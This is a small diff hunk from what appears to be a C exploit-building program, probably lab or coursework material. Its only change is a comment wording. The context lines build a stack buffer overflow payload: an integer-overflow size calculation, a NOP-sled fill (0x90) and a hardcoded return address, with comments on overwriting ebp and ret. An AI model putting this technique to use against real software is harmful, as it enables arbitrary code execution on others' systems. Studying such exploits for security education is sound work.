@@ -20,7 +20,7 @@ int main(void)
   const size_t max_int = 2147483647;
   //printf("%u\n", ((int) (max_int + 1)) * 2); // this is zero, we just need to add what we want for our buffer overflow
 
-  const size_t size = (num_widget + 1) * sizeof(struct widget_t); // + 1 because we need more bytes (10 for max_int, 1 for ',', 4 to overflow ebp and 4 for ret)
+  const size_t size = (num_widget + 1) * sizeof(struct widget_t); // + 1 because we need few more bytes (10 for max_int, 1 for ',', 4 to overflow ebp and 4 for ret)
   char attack[size];
   memset(attack, 0x90, size);
   char ret[] = "\xd0\xfc\xff\xbf";
